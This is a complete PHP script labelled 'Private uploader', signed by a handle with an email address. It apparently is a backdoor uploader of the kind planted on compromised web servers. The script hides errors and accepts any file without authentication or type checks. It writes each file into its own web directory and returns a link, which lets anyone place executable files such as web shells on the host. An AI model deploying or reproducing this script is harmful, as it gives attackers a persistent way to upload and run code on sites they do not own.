<?php ?>Private uploader | ---Thunder Cats----  <?php
/**  * @author: Thunder Cats  * @mail: Thunderc0027@gmail.com  * @Screenshot:   * @Last Updated: 16 Dec 2014 */
@ini_set('display_errors', 0);
function entre2v2($text, $marqueurDebutLien, $marqueurFinLien, $i = 1) {
    $ar0 = explode($marqueurDebutLien, $text);
    $ar1 = explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
if(isset($_POST['Submit'])){
    $filedir = "";
    $maxfile = '2888888';
 
    $file_name = $_FILES['image']['name'];
    $temporari = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$file_name;
        @move_uploaded_file($temporari, $abod);
 
echo"<center><b>Link ==> <a href='$file_name' target=_blank>$file_name</a></b></center>";
}
}
else{
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
}